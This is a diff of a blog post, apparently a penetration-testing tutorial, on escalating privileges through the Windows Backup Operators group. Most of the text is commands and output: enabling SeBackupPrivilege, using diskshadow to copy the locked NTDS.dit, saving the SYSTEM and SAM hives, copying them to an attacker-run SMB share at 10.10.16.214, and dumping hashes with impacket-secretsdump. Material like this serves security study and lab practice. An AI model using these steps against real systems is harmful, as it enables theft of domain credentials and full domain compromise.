@@ -1,6 +1,7 @@
 ---
 title: Backup Operators
 date: 2026-03-06 10:35:59
+
 categories:
   - Active Directory
   - Windows
@@ -13,9 +14,16 @@ tags:
   - diskshadow
   - ntds
   - active-directory
+
+cover: /img/privesc.png
+top_img: /img/bg-img.jpg
+description: Privilege escalation using the Backup Operators group.
 ---
 
+
 > ➜ Backup Operators is a privileged Windows group whose members can back up and restore files on a system, regardless of file permissions. This group grants powerful privileges such as `SeBackupPrivilege` and `SeRestorePrivilege`, which allow bypassing access controls. These privileges can be abused to `read sensitive files like the SAM, SYSTEM, or NTDS.dit`
+
+
 
 ## Enabling SeBackupPrivilege
 
@@ -31,7 +39,7 @@ Privilege Name                Description                    State
 SeBackupPrivilege             Back up files and directories  Disabled
 ```
 
-> ➜ In some cases, the privilege is present but disabled by default. So we can enable it using this [PoC](<https://github.com/giuliano108/SeBackupPrivilege>).
+> ➜ In some cases, the privilege is present but disabled by default. So we can enable it using this [PoC](https://github.com/giuliano108/SeBackupPrivilege).
 
 ```powershell
 PS C:\Users\svc_backup> Import-Module .\SeBackupPrivilegeUtils.dll
@@ -45,6 +53,7 @@ PS C:\Users\svc_backup> Get-SeBackupPrivilege
 SeBackupPrivilege is enabled
 ```
 
+
 ```powershell
 PS C:\Users\svc_backup> whoami /priv
 
@@ -57,7 +66,9 @@ Privilege Name                Description                    State
 SeBackupPrivilege             Back up files and directories  Enabled
 ```
 
-## Exploiting Privilege
+
+## Exploiting Privilege 
+
 
 #### Copying a Protected File
 
@@ -65,13 +76,14 @@ SeBackupPrivilege             Back up files and directories  Enabled
 Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
 ```
 
+
 #### NTDS.dit
 
-> Since the NTDS database is actively used by the system and therefore locked by default, we can use the Windows [diskshadow](<https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow>) built-in tool to create a Volume Shadow Copy of the `C:` drive and mount it as the `E:` drive for offline access.
-
+> Since the NTDS database is actively used by the system and therefore locked by default, we can use the Windows [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow)  built-in tool to create a Volume Shadow Copy of the `C:` drive and mount it as the `E:` drive for offline access.
 ###### Mount the `C:` Drive as a Shadow Copy
 
-```plaintext
+
+```
 PS C:\Users\svc_backup> diskshadow.exe
 
 set context persistent nowriters
@@ -82,7 +94,7 @@ expose %dfs% K:
 exit
 ```
 
-> ➜ This creates a shadow copy of C: and mounts it as drive K:.
+>➜ This creates a shadow copy of C: and mounts it as drive K:.
 
 ###### Copy NTDS.dit Locally
 
@@ -100,6 +112,7 @@ PS C:\> Copy-FileSeBackupPrivilege K:\Windows\NTDS\ntds.dit .\ntds.dit
 Copied 16777216 bytes
 ```
 
+
 ###### Copy the SYSTEM Registry Hive
 
 ```powershell
@@ -108,6 +121,7 @@ PS C:\Users\svc_backup>  reg save HKLM\SYSTEM SYSTEM.SAV
 
 ```powershell
 PS C:\Users\svc_backup> ls
+
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
@@ -119,12 +133,12 @@ Mode                LastWriteTime         Length Name
 ```
 
 > Now both files are available locally:
-> • ntds.dit
-> • SYSTEM.SAV
+>	•	ntds.dit
+>	•	SYSTEM.SAV
 
 ###### Transfer Files to Our Machine
 
-> Create an SMB server
+> Create an SMB server 
 
 ```bash
 ➜  SeBackupPrivilege sudo impacket-smbserver -smb2support share . -user test -password P@ssw0rd
@@ -132,7 +146,7 @@ Mode                LastWriteTime         Length Name
 
 > Mount the share on the target
 
-```plaintext
+```
 PS C:\Users\svc_backup> net use n: \\10.10.16.214\share /user:test P@ssw0rd
 ```
 
@@ -149,6 +163,7 @@ PS C:\Users\svc_backup> copy .\SYSTEM.SAV  n:\SYSTEM.SAV
 ➜  SeBackupPrivilege impacket-secretsdump -ntds ntds.dit -system SYSTEM.SAV LOCAL
 ```
 
+
 ## Dump SAM
 
 ###### Backing up SAM and SYSTEM Registry Hives
@@ -157,6 +172,7 @@ PS C:\Users\svc_backup> copy .\SYSTEM.SAV  n:\SYSTEM.SAV
 C:\> reg save HKLM\SYSTEM SYSTEM.SAV
 
 The operation completed successfully.
+
 
 C:\> reg save HKLM\SAM SAM.SAV
 
@@ -170,3 +186,4 @@ The operation completed successfully.
 ```bash
 ➜ SeBackupPrivilege impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
 ```
+
